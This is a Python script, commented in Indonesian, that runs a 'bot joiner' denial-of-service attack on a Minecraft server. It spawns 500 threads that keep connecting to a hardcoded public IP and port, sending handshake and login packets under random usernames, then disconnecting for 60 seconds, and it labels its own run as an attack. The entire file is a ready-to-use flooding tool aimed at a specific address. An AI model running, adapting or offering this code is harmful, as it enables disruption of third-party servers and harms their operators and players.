import socket
import struct
import threading
import random
import time

# Config
TARGET_IP = "15.235.229.58"       # Ganti dengan IP servermu
TARGET_PORT = 25526           # Port server Minecraft
THREADS = 500                 # Jumlah thread paralel
DURATION = 60                 # Durasi serangan dalam detik
USERNAME_PREFIX = "BotJoin_"

def write_varint(value):
    buf = b''
    while True:
        byte = value & 0x7F
        value >>= 7
        if value:
            buf += struct.pack('B', byte | 0x80)
        else:
            buf += struct.pack('B', byte)
            break
    return buf

def write_string(string):
    encoded = string.encode('utf-8')
    return write_varint(len(encoded)) + encoded

def build_packet(packet_id, data):
    packet = write_varint(packet_id) + data
    length = write_varint(len(packet))
    return length + packet

def bot_joiner():
    timeout = time.time() + DURATION
    while time.time() < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((TARGET_IP, TARGET_PORT))

            protocol_version = 754  # Versi protokol Minecraft 1.16.5+, bisa diubah
            handshake_data = (
                write_varint(protocol_version) +
                write_string(TARGET_IP) +
                struct.pack('>H', TARGET_PORT) +
                write_varint(2)  # Next state: login
            )
            sock.send(build_packet(0x00, handshake_data))

            username = USERNAME_PREFIX + ''.join(random.choices('0123456789ABCDEF', k=6))
            login_data = write_string(username)
            sock.send(build_packet(0x00, login_data))

            # Delay singkat lalu disconnect
            time.sleep(0.5)
            sock.close()

        except Exception:
            pass

print(f"Starting bot joiner attack to {TARGET_IP}:{TARGET_PORT} with {THREADS} threads for {DURATION}s")

threads = []
for _ in range(THREADS):
    t = threading.Thread(target=bot_joiner)
    t.daemon = True
    t.start()
    threads.append(t)

for t in threads:
    t.join()

print("Attack finished.")
